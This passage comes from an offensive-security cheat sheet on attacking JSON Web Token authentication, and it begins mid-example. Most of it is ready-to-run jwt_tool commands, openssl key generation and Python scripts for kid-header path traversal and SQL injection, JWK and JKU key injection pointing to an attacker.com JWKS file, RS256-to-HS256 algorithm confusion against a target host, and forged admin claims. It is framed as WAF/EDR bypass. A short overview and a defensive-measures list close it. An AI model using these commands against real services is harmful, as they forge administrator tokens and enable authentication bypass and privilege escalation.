token2 = jwt.encode({"user": "admin"}, "", algorithm="HS256", headers=header2)

# Use jwt_tool:
python3 jwt_tool.py <token> -X i -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
**Syntax breakdown:**
- `kid` — the JWT header field that specifies which key the server uses to verify the signature _value_
- `UNION SELECT` — SQL injection to control the kid query to return an attacker-specified key value _command_
- `../../dev/null` — path traversal to an empty file, making the key an empty string _value_
- `-X i` — jwt_tool's injection attack mode _parameter_

**WAF/EDR Bypass Variants:**

**JWK/JKU header key injection**
> Embed the attacker's public key in the jwk field of the JWT Header or point the jku field to the attacker's JWKS endpoint, making the server use the attacker-controlled key to verify the signature
```
# JWK embedded key injection:
# Generate an RSA key pair:
openssl genrsa -out attacker.key 2048
openssl rsa -in attacker.key -pubout -out attacker.pub

# Construct the JWT Header:
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"<attacker_n_base64>","e":"AQAB","use":"sig"}}
# Sign with attacker.key, the server takes the public key from the jwk field to verify

# JKU remote key injection:
{"alg":"RS256","jku":"http://attacker.com/jwks.json"}
# Deploy a JWKS file containing the attacker's public key on attacker.com

# Use jwt_tool:
python3 jwt_tool.py <token> -X s -pr attacker.key
```
**Syntax breakdown:**
- `# JWK embedded key injection:` — primary command _command_
- `...` — 12 lines total _value_

**Algorithm downgrade and nested token exploitation**
> Use the RS256-to-HS256 algorithm confusion attack (using the public key as the symmetric key to sign), or embed a forged internal JWT token in the JWT Payload to trigger a recursive parsing vulnerability
```
# Algorithm downgrade (RS256→HS256):
# After obtaining the server public key, use it as the HS256 key:
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > pub.pem
python3 -c "
import jwt
pub = open('pub.pem').read()
token = jwt.encode({'user':'admin','role':'admin'}, pub, algorithm='HS256')
print(token)"

# Claim tampering + nested JWT:
# Embed another JWT in the JWT payload:
{"user":"admin","inner_token":"<another forged JWT>"}
# Some systems recursively parse the inner_token
```
**Syntax breakdown:**
- `# Algorithm downgrade (RS256→HS256):` — primary command _command_
- `...` — 12 lines total _value_

**Overview:** JWT (JSON Web Token) is an authentication mechanism widely used in modern web applications and APIs. A JWT consists of three parts: Header.Payload.Signature. Common attacks include: Algorithm None (disabling the signature), key brute force, RS256→HS256 algorithm confusion, KID parameter injection, and so on, all of which can lead to authentication bypass and privilege escalation.

**Vulnerability Principle:** Common JWT security flaws: 1) the server does not validate the alg field (accepts none) 2) uses a weak key (can be brute-forced) 3) confuses symmetric/asymmetric algorithms (RS256→HS256) 4) the kid field is not filtered (SQL injection/path traversal) 5) does not validate the exp expiration time 6) sensitive information is stored in plaintext in the payload.

**Exploitation Method:** Exploitation flow: 1) intercept and decode the JWT to analyze the structure 2) test the Algorithm None attack 3) try HS256 key brute force 4) obtain the public key to test algorithm confusion 5) test kid parameter injection 6) tamper with the permission field in the payload for validation.

**Defensive Measures:** 1) strictly validate the alg field (allowlist) 2) use a strong random key (256+ bits) 3) RS256 is better than HS256 4) use parameterized queries for the kid field 5) always validate exp and iat 6) do not store sensitive data in the payload 7) implement a JWT revocation mechanism.

---
